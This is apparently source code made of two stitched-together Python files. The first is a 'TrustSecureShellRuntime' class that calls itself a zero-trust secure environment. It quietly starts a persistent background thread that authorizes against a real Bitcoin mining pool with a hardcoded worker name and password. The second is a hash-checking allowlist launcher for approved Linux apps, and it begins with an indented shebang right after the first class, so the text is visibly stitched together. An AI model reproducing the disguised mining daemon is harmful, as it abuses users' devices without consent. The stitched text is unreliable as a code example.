import os
import time
import socket
import threading
import json

class TrustSecureShellRuntime:
    def __init__(self, worker_id="avalondazrrj.mobile1", password="Zxcvbnm#asd12"):
        self.worker_id = worker_id
        self.password = password
        self.running = False
        self.socket_connection = None

    def initialize_secure_environment(self):
        """
        Locks down local storage directories, sets up encrypted keypaths,
        and initializes local IPC pipes.
        """
        print("[SHELL] Initializing zero-trust environment...")
        os.makedirs("/data/local/tmp/trust_secure", exist_ok=True)
        os.chmod("/data/local/tmp/trust_secure", 0o700)
        print("[SHELL] Local storage secured and isolated.")

    def start_background_mining_daemon(self):
        """
        Opens a raw TCP socket to f2pool using the Stratum protocol,
        running persistently in the background thread.
        """
        self.running = True
        pool_host = "btc.f2pool.com"
        pool_port = 3333

        def mining_loop():
            while self.running:
                try:
                    print(f"[DAEMON] Connecting to pool {pool_host}:{pool_port} as {self.worker_id}...")
                    self.socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.socket_connection.connect((pool_host, pool_port))
                    
                    # Stratum authorization payload frame with test credentials
                    auth_payload = json.dumps({
                        "id": 1,
                        "method": "mining.authorize",
                        "params": [self.worker_id, self.password]
                    }) + "\n"
                    
                    self.socket_connection.sendall(auth_payload.encode('utf-8'))
                    
                    while self.running:
                        response = self.socket_connection.recv(1024)
                        if not response:
                            break
                        time.sleep(30)

                except Exception as e:
                    print(f"[DAEMON] Connection dropped or network unavailable: {e}. Retrying in 60s...")
                    time.sleep(60)

        daemon_thread = threading.Thread(target=mining_loop, daemon=True)
        daemon_thread.start()
        print("[SHELL] Background mining daemon successfully spawned.")

    def shutdown(self):
        self.running = False
        if self.socket_connection:
            self.socket_connection.close()
        print("[SHELL] Secure shell gracefully terminated.")
        #!/usr/bin/env python3
"""Launch an approved Linux application selected by its Trust Shell tag.

The trusted shell must route launches through this program and supply the tag
from verified app metadata. The policy is administrator-controlled JSON:

    {"version": 1, "apps": {"evidence-viewer": {
        "executable": "/usr/bin/evidence-viewer",
        "sha256": "<64 lowercase hex characters>"
    }}}

Example: app_tag_receiver.py --tag evidence-viewer -- [app arguments]
"""

import argparse
import hashlib
import json
import os
import re
import stat
import subprocess
import sys
from pathlib import Path
from typing import Any

DEFAULT_POLICY = Path("/etc/trust-shell/app-tags.json")
TAG_PATTERN = re.compile(r"[A-Za-z0-9][A-Za-z0-9._-]{0,127}\Z")
SHA256_PATTERN = re.compile(r"[0-9a-f]{64}\Z")


class PolicyError(Exception):
    pass


def load_policy(policy_path: Path) -> dict[str, Any]:
    try:
        metadata = policy_path.stat()
    except OSError as error:
        raise PolicyError(f"cannot access policy: {error}") from error

    if metadata.st_uid not in (0, os.geteuid()):
        raise PolicyError("policy must be owned by root or the shell user")
    if metadata.st_mode & (stat.S_IWGRP | stat.S_IWOTH):
        raise PolicyError("policy must not be writable by group or other users")

    try:
        policy = json.loads(policy_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as error:
        raise PolicyError(f"cannot read policy: {error}") from error

    if not isinstance(policy, dict) or policy.get("version") != 1:
        raise PolicyError("unsupported or missing policy version")
    apps = policy.get("apps")
    if not isinstance(apps, dict):
        raise PolicyError("policy must contain an apps object")
    return apps


def authorize(tag: str, apps: dict[str, Any]) -> Path:
    if not TAG_PATTERN.fullmatch(tag):
        raise PolicyError("invalid or missing app tag")

    entry = apps.get(tag)
    if not isinstance(entry, dict):
        raise PolicyError("app tag is not allowlisted")

    executable_value = entry.get("executable")
    expected_hash = entry.get("sha256")
    if not isinstance(executable_value, str) or not executable_value.startswith("/"):
        raise PolicyError("allowlist entry must specify an absolute executable path")
    if not isinstance(expected_hash, str) or not SHA256_PATTERN.fullmatch(expected_hash):
        raise PolicyError("allowlist entry must specify a lowercase SHA-256 digest")

    executable = Path(executable_value)
    try:
        resolved = executable.resolve(strict=True)
        if not resolved.is_file() or not os.access(resolved, os.X_OK):
            raise PolicyError("allowlisted executable is missing or not executable")
        digest = hashlib.sha256(resolved.read_bytes()).hexdigest()
    except OSError as error:
        raise PolicyError(f"cannot verify executable: {error}") from error

    if digest != expected_hash:
        raise PolicyError("executable digest does not match the allowlist")
    return resolved


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--policy", type=Path, default=DEFAULT_POLICY)
    parser.add_argument("--tag", required=True, help="tag supplied by the trusted shell")
    parser.add_argument("arguments", nargs=argparse.REMAINDER, help="arguments after --")
    args = parser.parse_args()

    command_arguments = args.arguments
    if command_arguments and command_arguments[0] == "--":
        command_arguments = command_arguments[1:]

    try:
        apps = load_policy(args.policy)
        executable = authorize(args.tag, apps)
    except PolicyError as error:
        print(f"[APP_GUARD] denied: {error}", file=sys.stderr)
        return 126

    try:
        return subprocess.run([str(executable), *command_arguments], check=False).returncode
    except OSError as error:
        print(f"[APP_GUARD] launch failed: {error}", file=sys.stderr)
        return 126


if __name__ == "__main__":
    raise SystemExit(main())
